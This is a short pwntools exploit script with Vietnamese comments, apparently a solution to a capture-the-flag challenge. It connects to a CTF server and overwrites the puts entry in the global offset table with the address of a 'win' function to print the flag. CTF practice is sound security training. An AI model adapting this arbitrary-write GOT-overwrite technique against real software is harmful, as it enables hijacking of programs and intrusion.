from pwn import *

# p = process('./chall')
p = remote('chall.0xfun.org', 21002)
elf = ELF('./chall')

# 1. Lấy địa chỉ của puts@GOT
# Đây là nơi lưu địa chỉ thực của hàm puts khi thực thi
puts_got = elf.got['puts']

# 2. Lấy địa chỉ của hàm win
win_addr = elf.symbols['win']

log.info(f"puts@GOT: {hex(puts_got)}")
log.info(f"win address: {hex(win_addr)}")

# 3. Gửi payload
# Lần 1: Nhập địa chỉ muốn ghi vào (v4)
p.sendlineafter(b"Show me what you GOT!", str(puts_got).encode())

# Lần 2: Nhập giá trị muốn ghi (v5[0])
p.sendlineafter(b"I want to see what you GOT!", str(win_addr).encode())

# Nhận flag
print(p.recvall().decode())
